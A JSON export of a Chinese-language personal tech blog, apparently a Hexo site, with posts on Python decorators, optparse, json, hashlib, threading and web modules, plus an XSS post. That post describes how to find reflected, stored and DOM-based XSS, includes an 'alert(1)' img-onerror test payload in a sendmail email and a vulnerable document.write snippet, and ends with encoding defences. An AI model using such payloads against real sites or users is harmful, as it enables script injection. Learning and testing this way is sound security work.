Programming","slug":"Functions-and-Functional-Programming","date":"2016-06-13T02:02:40.000Z","updated":"2016-07-22T08:26:06.000Z","comments":true,"path":"2016/06/13/Functions-and-Functional-Programming/","link":"","permalink":"/2016/06/13/Functions-and-Functional-Programming/","excerpt":"Python的函数与函数式编程","text":"Python的函数与函数式编程 装饰器装饰器实际就是函数，接受函数对象，对该对象进行包装。当包装一个函数的时候，最终会调用它。比如在执行函数之前运行些预备代码，或者在执行之后做些清理工作。例如： 引入日志 增加计时逻辑来检测性能 给函数加入事务的能力 12345678910111213141516171819from time import ctime, sleepdef deco(func): def tsfun(): print &quot;[%s] %s called&quot; % (ctime(), func.__name__) return func() return tsfun@decodef foo(): print &quot;foo self&quot;foo()sleep(4)for i in range(2): sleep(1) foo() 输出结果： 123456[Tue Jun 14 13:25:43 2016] foo calledfoo self[Tue Jun 14 13:25:48 2016] foo calledfoo self[Tue Jun 14 13:25:49 2016] foo calledfoo self deco函数返回一个装饰了func函数的函数 可变长度参数非关键字可变长参数（元祖）12def tupleVarArgs(arg1, arg2=&apos;default&apos;, *theRest): code 关键字变量参数（字典）12def dictVarArgs(arg1, arg2=&apos;default&apos;, *tuples, **theRest): code 函数式编程匿名函数与lambda123test = lambda x, y =2: x + yprint test(3) 结果为5 闭包如果一个内部函数对外部函数的变量进行了引用那么就称为闭包 闭包对于安装计算、隐藏状态和在函数对象和作用域中随意地切换是很有用的 12345678910111213def func(): fs = [] for i in range(1, 4): def g(j): def k(): return j * j return k fs.append(g(i)) return fsg1, g2, g3 = func()print g1(), g2(), g3() 结果：1，4，9","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]},{"title":"Some Modules in Python","slug":"Some-Modules-in-Python","date":"2016-05-31T02:29:29.000Z","updated":"2016-07-22T08:27:12.000Z","comments":true,"path":"2016/05/31/Some-Modules-in-Python/","link":"","permalink":"/2016/05/31/Some-Modules-in-Python/","excerpt":"Python中的一些实用模块","text":"Python中的一些实用模块 1 optparse:提供了命令行参数的解析／处理1.1 示例代码: 12345678910from optparse import OptionParserparser = OptionParser()parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, \\help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;)parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, dest=&quot;verbose&quot;, \\default=True, help=&quot;do not print status messages to stdout&quot;)(options, args) = parser.parse_args() 命令行输入: 1optp.py -h/--help 输出: 123456Usage: optp.py [options]Options: -h, --help show this help message and exit -f FILE, --file=FILE write report to FILE -q, --quiet do not print status messages to stdout 命令行输入: 12345&lt;yourscript&gt; --file=outfile -q&lt;yourscript&gt; -f outfile --quiet&lt;yourscript&gt; --quiet --file outfile&lt;yourscript&gt; -q -foutfile&lt;yourscript&gt; -qfoutfile optparse支持长选项和短选项，允许短选项混合在一起，允许选项和参数以各种各样的方式联系在一起，所以上面的格式都是正确的 1.2 使用方法首先导入OptionParser类，然后创建一个实例 12from optparser import OptionParserparser = OptionParser() 接着定义选项，基本语法为 1parser.add_option(opt_str, ..., arrt=value, ...) 每个选项有一个或者一个以上的选项字符串，例如-f or –file， 和一些告诉optparse what to expect and 当在命令行遇到该选项应该做什么的选项属性 1parser.add_option(&quot;-f&quot;, &quot;--file&quot;, ...) 最后，一旦定义好了所有的命令行参数，调用parse_args()来解析程序的命令行 1(options, args) = parser.parse_args() 注：也可以传递一个命令行参数列表到parse_args()(但是基本是没有必要的)，否则默认用sys.argv[1:] parse_args()返回两个值： options，一个对象包含所有命令行参数的值 args，由positional arguments组成的列表 这个使用方法cover了四个最重要的选项属性：action，type，dest(destination)，help，其中action是最基础的 ActionAction告诉optparse当在命令行碰到选项是时要做什么。Most actions告诉optparse在一个变量中储存一个值(例如在options的属性中存储命令行中的字符串)，如果不指定选项的action，默认为store最普遍的action是store，告诉optparse取下一个参数(或者现在参数的剩余部分)，确保它是正确的类型，然后把它储存到选择的destination例： 12parser.add_option(&quot;-f&quot;, &quot;--file&quot;, action=&quot;store&quot;, type=&quot;string&quot;,\\dest=&quot;filename&quot;) 现在创造一个假的命令行并要求optparse解析它 12args = [&quot;-f&quot;, &quot;foo.txt&quot;](options, args) = parser.parse_args(args) foo.txt会被存储在options.filename中(that is options.filename=”foo.txt”)optparse支持一些其他的option type：int和float，如果不指定，默认为string 再加上action默认为store，示例可以缩短为： 1parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;) 如果不提供desttination，optparse将选项字符串中figure out一个默认：如果第一个长选项为–foo-bar，则默认destination为foo_bar，如果没有长选项，optparse将看短选项：-f的默认destination是f optparse支持两个分离的action：store_ture和store_false来应对需要把一个变量置为true或者false的情况。这两个值用于处理命令行参数后面不带值的情况，如-v，-q等 12parser.add_option(&quot;-v&quot;, action=&quot;store_true&quot;, dest=&quot;verbose&quot;)parser.add_option(&quot;-q&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;) 这样的话，当解析到-v，options.verbose=Ture, 解析到-q, options.verbose=False 其它action的值还有： store_const: store a constant value append: append this option’s argument to a list count: increment a counter by one callback: call a specified function 默认值当有些期待的命令行参数没有出现的时候，需要给destination设定一个默认值 例：我们想把verbose设定为True除非命令行参数出现-q，可以这样 12parser.add_option(&quot;-v&quot;, action=&quot;store_true&quot;, dest=&quot;verbose&quot;, default=&quot;True&quot;)parser.add_option(&quot;-q&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;) 因为都是作用于同一个destination，下面这种写法与上面等效 12parser.add_option(&quot;-v&quot;, action=&quot;store_true&quot;, dest=&quot;verbose&quot;)parser.add_option(&quot;-q&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=&quot;True&quot;) 当上例中的两条语句中都有default时，以最后一个default为准 一个更清楚的方式是在调用parse_args()方法之前的任意时间调用set_default()方法 123parser.set_default(verbose=True)parser.add_option(...)(options, args) = parser.parse_args() 生成程序帮助和程序版本optparse的另一个实用功能是生成帮助文档，只需要为add_option()方法的help参数制定帮助信息文本。程序版本需要在创建OptionParser对象时指定version参数 123456789101112131415# %prog会被自动替换为当前脚本的名称usage = &quot;usage: %prog [options] arg1 arg2&quot;parser = OptionParser(usage=usage, version=&quot;%prog 1.0&quot;)parser.add_option(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;make lots of noise [default]&quot;)parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, help=&quot;be vewwy quiet (I&apos;m hunting wabbits)&quot;)parser.add_option(&quot;-f&quot;, &quot;--filename&quot;, metavar=&quot;FILE&quot;, help=&quot;write output to FILE&quot;)parser.add_option(&quot;-m&quot;, &quot;--mode&quot;, default=&quot;intermediate&quot;, help=&quot;interaction mode: novice, intermediate, &quot; &quot;or expert [default: %default]&quot;) 处理异常optparse可以自动探测应处理一些用户异常，用户也可以使用parser.error()方法来自定义一些异常处理 123(options, args) = parser.parse_args()if options.a and options.b: parser.error(&quot;options -a and -b are mutually exclusive&quot;) 如果命令行中-a -b同时存在，则显示”options…”来警告用户 官方文档： https://docs.python.org/2/library/optparse.html# 2 json(JavaScript Object Notation)2.1 基本用法2.1.1 dump()json.dump(obj, fp, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding=”utf-8”, default=None, sort_keys=False, **kw) 基于转换表，将obj序列化为json格式的流到fp(一个支持write()的类文件对象) 2.1.2 load()json.load(fp[, encoding[, cls[, object_hook[, parse_float[, parse_int[, parse_constant[, object_pairs_hook[, **kw]]]]]]]]) 根据转换表将fp(一个包含json文档的支持read()的类文件对象)反序列化成python对象 example: 123456import jsonimport osjson_payload = json.load(open(&quot;&quot;.join([os.path.split(os.path.realpath(__file__))[0], &quot;/testjson.json&quot;])))print json_payload Hint: os.path.split(path)将路径分为路径与文件名两部分，os.path.realpath(__file__)为当前脚本的路径 3 hashlib提供不同的secure hash algorithm，包括SHA1，SHA224，SHA256，SHA384，SHA512，MD5 1234import hashlibh = hashlib.new(&quot;md5&quot;, &quot;md5canbeinsteadedbyotheralgorithms&quot;)print h.hexdigest()","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]},{"title":"MultiThread in Python","slug":"MultiThread-in-Python","date":"2016-05-19T06:24:40.000Z","updated":"2016-07-22T08:26:47.000Z","comments":true,"path":"2016/05/19/MultiThread-in-Python/","link":"","permalink":"/2016/05/19/MultiThread-in-Python/","excerpt":"Python中的多线程","text":"Python中的多线程 0x1 多线程？多线程就是多个线程并发执行，提高效率。 0x1.1 进程？线程？进程时程序的一次执行。线程是CPU调度的基本单位，所有线程运行在同一个进程中。 0x1.2 并发执行时各线程间的执行顺序？为了解决这个问题，引入了锁。当某个线程拥有了这个锁它才能够得到执行。这里要提一下线程的生命周期：新建，就绪，运行，堵塞，死亡。当线程不拥有锁的时候，它就处于阻塞状态，在锁定池等待。除锁定池外，还有等待池，等待池是等待一个事件的发生（条件变量），比如等待磁盘I/O的完成，完成后，会通知一个或全部之前等待的线程，于是这些线程进入锁定池。 0x2 在Python中使用线程Python中提供了几个用语多线程编程的模块，包括thread,threading,Queue等。 0x2.1 thread模块python核心编程的作者这样说： 出于以下几点考虑，我们不推荐您使用thread模块。首先，更高级别的threading模块更为先进，对线程的支持更为完善，而且实用thread模块里的属性可能会与threading冲突。其次，低级别的thread模块的同步原语很少（实际上只有一个），而threading模块则有很多。另外一个不要使用thread的原因是，对于你的进程什么时候应该结束完全没有控制，当主线程结束时，所有的线程都要强制结束掉，没有警告也不会有正常的清除工作，threading模块能确保重要的子线程退出后进程才退出。 0x2.2 threading模块 0x2.2.1 守护线程threading模块支持守护线程（thread模块则不）。如果设定一个线程为守护线程则表示这个线程是不重要的，在退出进程时不用等待这个线程退出。设定线程的daemon属性可以定义一个线程为守护进程：在线程开始（调用thread.start()）之前，调用setDaemon()函数（thread.setDaemon(True)）。可以调用thread.isDaemon()函数来判断其daemon标志的值。 0x2.2.2 Thread类用Thread类可以用多种方法来创建线程： 创建一个Thread的实例，传给它一个函数123456789101112131415161718192021222324252627282930313233import threadingfrom time import sleep, ctimeloops = [4, 2]def loop(nloop, nsec): print &quot;start&quot;, nloop, &quot;at&quot;, ctime() sleep(nsec) print &quot;end&quot;, nloop, &quot;at&quot;, ctime()def main(): print &quot;start at&quot;, ctime() nloop = range(len(loops)) threads = [] for i in nloop: t = threading.Thread(target=loop, args=(i, loops[i])) threads.append(t) for i in nloop: threads[i].start() for i in nloop: threads[i].join() print &quot;end at&quot;, ctime()if __name__ == &quot;__main__&quot;: main() 其中要重点标记一下join()这个方法，一开始不是很理解。join()的作用是阻塞进程直到线程执行完毕。此外，join()函数还有个特殊的功能就是设置超时:Thread.join([timeout])，也就是通过传给join一个参数超过这个指定的时间join就不再阻塞进程。只有在要等待线程结束的时候才要调用join()。 创建一个Thread的实例，传给它一个可调用的类对象(更符合面向对象思想)12345678910111213141516171819202122232425262728293031323334353637383940414243import threadingfrom time import sleep, ctimeloops = [4, 2]class ThreadFunc(object): def __init__(self, func, args, name=&apos;&apos;): self.func = func self.args = args self.name = name def __call__(self): apply(self.func, self.args)def loop(nloop, nsec): print &quot;start&quot;, nloop, &quot;at&quot;, ctime() sleep(nsec) print &quot;end&quot;, nloop, &quot;at&quot;, ctime()def main(): print &quot;start at&quot;, ctime() threads = [] nloops = range(len(loops)) for i in nloops: t = threading.Thread(target=ThreadFunc(loop, (i, loops[i]), loop.__name__)) threads.append(t) for t in threads: t.start() for t in threads: t.join() print &quot;end at&quot;, ctime()if __name__ == &apos;__main__&apos;: main() 一个对象可能有很多种方法，将对象传递给Thread类时，调用的是call方法，此方法为线程专门设计。 从Thread派生出一个子类，创建一个这个子类的实例这样做可以更灵活的定制线程对象，而且创建线程的时候也更简单。1234567891011121314151617181920212223242526272829303132333435363738394041424344import threadingfrom time import sleep, ctimeloops = [4, 2]class MyThread(threading.Thread): def __init__(self, func, args, name=&apos;&apos;): threading.Thread.__init__(self) self.func = func self.args = args self.name = name def run(self): apply(self.func, self.args)def loop(nloop, nsec): print &quot;start %d at %s&quot; % (nloop, ctime()) sleep(nsec) print &quot;end %d at %s&quot; % (nloop, ctime())def main(): print &quot;START AT %s&quot; % ctime() threads = [] nloops = range(len(loops)) for i in nloops: t = MyThread(loop, (i, loops[i]), loop.__name__) threads.append(t) for i in threads: i.start() for i in threads: i.join() print &quot;END AT %s&quot; % ctime()if __name__ == &quot;__main__&quot;: main() 与2相比两点改变： 子类构造器一定要先调用父类的构造器 call()名字要改为run() 0x2.3 Queue模块Queue模块可以用来进行线程间通讯，让各个线程之间共享数据。 0x2.4 LockMUTEX = threading.Lock()创建一个锁对象 MUTEX.acquire([timeout])获得锁，可选参数timeout表示超过该时间后通过返回值可以判断是否得到了锁，从而进行一些其他处理 MUTEX.release()释放锁","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]},{"title":"Cross Site Script","slug":"Cross Site Scirpt","date":"2016-04-04T01:12:03.000Z","updated":"2016-07-22T08:25:51.000Z","comments":true,"path":"2016/04/04/Cross Site Scirpt/","link":"","permalink":"/2016/04/04/Cross Site Scirpt/","excerpt":"跨站脚本XSS的原理，自动化探查和利用","text":"跨站脚本XSS的原理，自动化探查和利用 0x0 分类XSS漏洞表现为各种形式，并且可分为3种类型：反射型，保存型和基于DOM的XSS漏洞 0x1 反射型XSS漏洞0x1.1 简介HTTP请求中带了攻击脚本，立马就能在HTTP响应中（后台处理的漏洞）有体现。 0x1.2 攻击原理Hacker—发现存在反射XSS的URL—根据输出点的环境构造XSS代码—进行编码、缩短(可有可无，是为了增加迷惑性)—发送给受害人—受害打开后，执行XSS代码—完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等) 0x1.3 触发条件需要欺骗用户自己去点击带有特定参数的链接才能触发 0x1.4 触发原因 没有对输入进行约束，没有对输出进行编码 没有严格区分“数据”和“代码” 0x1.5 可能出现漏洞的地方搜索引擎，错误页面。 0x1.6 查找并利用0x1.6.1 查找漏洞确定应用程序所有的用户输入进入点，并遵循以下步骤： 在每个进入点提交一个良性字母字符串 确定此字符串“反射”在应用程序中的所有位置 对于每个反射，确定显示反射数据地方的上下文环境 提交针对上下文环境而修改的数据，尝试在响应中引入任意脚本 如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤 代码：https://github.com/AlmondQ/xss_scan 关于代码，有几点需要注意。 一是url的去重： netloc的hash值 path字符串拆解成列表的列表长度(尾页特征specially定义) path中字符串的长度 query参数名hash a=1&amp;b=2&amp;c=3 : hash(‘abc’) 二是各种位置的各种payload 0x2 保存型XSS漏洞如果一名用户提交的数据被保存在应用个程序中（通常保存在一个后端数据库中），然后不经适当过滤或净化就显示给其他用户，此时就会出现这种漏洞。 0x2.1 查找漏洞 向应用程序的每一个可能的位置提交一个特殊的字符串后，必须反复检查应用程序的全部内容与功能，确定这个字符串在浏览器中的任何显示情况。因为在某个位置（如个人信息页面的姓名字段）输入的用户控制的数据，这个数据可能会在应用程序的许多不同位置，每个位置都可能实施了不同的保护性过滤，因此需要单独分析。 如有可能，应检查管理员能够访问的所有区域，确定其中是否存在任何可被非管理用户控制的数据。例如，应用程序一般允许管理员在浏览器中检查日志文件。这种类型的功能极有可能包含XSS漏洞，攻击者通过生成含有恶意HTML的日志记录即可对其加以利用 在向应用程序中的每个位置提交一个测试字符串时，并不总是把它作为每个页面的每一个参数这样简单。在被保存提交的数据之前，许多应用程序功能需要经历几个阶段的操作。例如，注册新用户，处理购物订单，转账等操作往往需要按照规定好的顺序提交几个不同的请求，为避免遗漏任何漏洞，必须确保每次测试彻底完成 分析应用程序用于接收并处理可控输入的任何带外通道 如果应用程序允许文件上传与下载，应始终探查这种功能是否易于收到保存行XSS攻击 充分发挥想象，确定控制的数据是否可以通过任何其他方法保存在应用程序中并显示给其他用户 0x2.2 一些技巧 在Web邮件应用程序中测试XSS 电子邮件客户端无法完全控制原始的邮件内容，或者邮件客户端可能会净化或清楚有意设计的畸形语法，在这种情况下，最好是采用其他方法来生成电子邮件，以便于直接控制邮件的内容。一种方法是使用UNIX sendmail命令。首先，需要使用应当用于向外发送电子邮件的邮件服务器的详细信息配置电脑，然后可以在文本编辑器中创建原始的电子邮件，并使用一下命令发送该邮件：sendmail -t test@example.org &lt; email.txt 以下为原始邮件的一个示例，在消息主体中测试各种XSS有效载荷荷避开过滤的机制时，也可以尝试指定不同的Content-Type和charset： MIME-Version: 1.0From: test@example.orgContent-Type: text/html; charset=us-asciiCotent-Transfer-Encoding: 7bitSubject: XSS test &lt;img src=``onerror= alert(1)&gt; 在上传文件中测试XSS如果应用程序允许用户上传可被其他用户下载并查看的文件，就会出现保存型XSS漏洞。应用程序是否易于收到上传文件的攻击，取决于许多影响因素： 在文件上传过程中，应用程序可能会限制可以上传的文件的扩展名 在文件上传过程中，应用程序可能会检查文件内容，以确认其是否为所需的格式 在文件下载过程中，应用程序可能会返回Content-Type消息头，以指定文件所包含的内容类型 在文件的下载过程中，应用程序可能会返回Content-Disposition消息头，以指定浏览器应将文件保存到磁盘上。否则，对于相关的内容类型，应用程序会处理并在用户的浏览器中显示文件 在测试文件上传功能时，首先应该先尝试上传一个包含概念验证脚本的简单HTML文件，如果该文件被接受，则尝试以正常方式下载该文件，如果应用程序按原样返回最初的文件，并且你的脚本得以执行，则应用程序易受攻击如果应用程序阻止上传的文件，尝试使用各种文件扩展名，包括txt和jpg 混合文件攻击 例：GIFAR（GIF和JAR） 在通过Ajax上传的文件中测试XSS 0x3 基于DOM的XSS漏洞在这种漏洞中，攻击者的javascript通过以下过程得以执行： 用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式javascript 服务器的响应中并不以任何形式包含攻击者的脚本 当用户的浏览器处理这个响应时，上述脚本得以处理 例如，假设应用程序返回错误的页面包含以下脚本： 123456&lt;script&gt; var url = document.location; url = unescape(url); var message = url.substring(url.indexOf(&apos;message&apos;) + 8, url.length); document.write(message);&lt;/script&gt; 这段脚本解析url，提取出message参数的值，并把这个值写入页面的HTML源代码中。 0x3.1 查找漏洞检查所有客户端javascript，看其中是否使用了任何可能会导致漏洞的DOM属性。一个有用的工具为DOMTracer 0x4 防止XSS攻击 确认输入 长度限制 值类型是否正确 是否包含特殊字符 确认输出：根据输出的位置进行相应的编码 进入HTML标签之间 &amp; –&gt;\\&amp; &lt; –&gt;\\&lt; &gt; –&gt;\\gt; “ –&gt;\\&quot; ‘ –&gt;\\&#x27; / –&gt;\\&#x2F; 进入HTML普通属性 如果是单引号或双引号引起来的，那就简单了，只要编码单引号或双引号为&#xHH;的形式即可，否则要编码的就多了：空格（包含ASCII十进制数的9，10，11，12，13，32）&lt;&gt;等，所以强烈建议用引号引起来 进入javascript中小心标签带有href，src，ation，style，on事件的属性，因为这些属性中的javascript会首先被进行html解码 进入CSS中CSS非常松散，如果是定义具体某CSS属性的值，避免出现’ “ ; } { ( )等特殊字符如果允许用户完整自定义CSS，则需要过滤掉javascript伪协议，expression及各种变形，@import及各种变形等 进入URL中一般就是对特殊字符采用%HH（十六进制）形式的编码 消除危险的插入点","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Web","slug":"Web","permalink":"/tags/Web/"}]},{"title":"Python Web Programming","slug":"Python-Web-Programming","date":"2016-03-18T02:26:52.000Z","updated":"2016-08-18T08:15:53.000Z","comments":true,"path":"2016/03/18/Python-Web-Programming/","link":"","permalink":"/2016/03/18/Python-Web-Programming/","excerpt":"处理Web网页时需要的一些模块","text":"处理Web网页时需要的一些模块 urlparseurlparse模块对url进行解析 1234from urlparse import urlparseprint urlparse(&quot;https://www.youtube.com/results?sp=CAM%253D&amp;q=metasploitable+2&quot;) 结果： 1ParseResult(scheme=&apos;https&apos;, netloc=&apos;www.youtube.com&apos;, path=&apos;/results&apos;, params=&apos;&apos;, query=&apos;sp=CAM%253D&amp;q=metasploitable+2&apos;, fragment=&apos;&apos;) urllib2urllib2模块处理打开url的问题 12345678import urllib2f = urllib2.urlopen(&quot;http://cuiqingcai.com/1319.html&quot;)print f.getcode() # 状态码print f.geturl() # 实际得到网页所属的urlprint f.info() # 得到meta informationprint f.read() # 网页内容 一些例子HTTP 验证1234567891011import urllib2# Create an OpenerDirector with support for Basic HTTP Authentication...auth_handler = urllib2.HTTPBasicAuthHandler()auth_handler.add_password(realm=&apos;PDQ Application&apos;, uri=&apos;https://mahler:8092/site-updates.py&apos;, user=&apos;klem&apos;, passwd=&apos;kadidd!ehopper&apos;)opener = urllib2.build_opener(auth_handler)# ...and install it globally so it can be used with urlopen.urllib2.install_opener(opener)urllib2.urlopen(&apos;http://www.example.com/login.html&apos;) 添加HTTP头123456import urllib2req = urllib2.Request(&apos;http://www.example.com/&apos;)req.add_header(&apos;Referer&apos;, &apos;http://www.python.org/&apos;)# Customize the default User-Agent header value:req.add_header(&apos;User-Agent&apos;, &apos;urllib-example/0.1 (Contact: . . .)&apos;)r = urllib2.urlopen(req) Beautiful SoupBeautiful Soup库用来解析网页 参考：http://cuiqingcai.com/1319.html","categories":[{"name":"Journey of Study","slug":"Journey-of-Study","permalink":"/categories/Journey-of-Study/"}],"tags":[{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]}]}